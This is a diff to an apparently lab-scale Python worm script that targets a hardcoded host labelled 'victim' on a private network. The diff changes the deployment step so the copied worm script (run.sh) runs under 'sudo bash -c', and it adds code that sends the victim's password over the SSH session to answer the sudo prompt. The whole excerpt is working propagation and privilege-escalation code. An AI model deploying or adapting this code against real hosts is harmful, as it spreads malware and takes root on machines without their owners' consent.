@@ -39,7 +39,7 @@ def attack():
     os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
 
     # Run the worm
-    command = 'cd /home/{0}/Worm_Attack && ( ./run.sh ) \nvictim'
+    command = 'cd /home/{0}/Worm_Attack && (sudo bash -c ./run.sh )'
     ssh_command_using_ssh_key(command)
 
 
@@ -77,9 +77,16 @@ def ssh_command_using_ssh_key(command):
         print(session.recv(2048))
         print('--------Victim Std Out--------\n')
 
+        if command.find('sudo') > -1:
+            print('sudo is coming!!')
+            session.exec_command(victim['password'])
+
+            print('\n--------Victim Std Out--------')
+            print(session.recv(2048))
+            print('--------Victim Std Out--------\n')
+
     else:
         print('Session Failed')
-    pass
 
 
 def set_up_user():
@@ -88,7 +95,6 @@ def set_up_user():
     # victim['port'] = int(raw_input('port: '))
     # victim['name'] = raw_input('name: ')
     # victim['password'] = raw_input('password: ')
-
     victim['ip'] = '192.168.31.145'
     victim['port'] = 5555
     victim['name'] = 'victim'
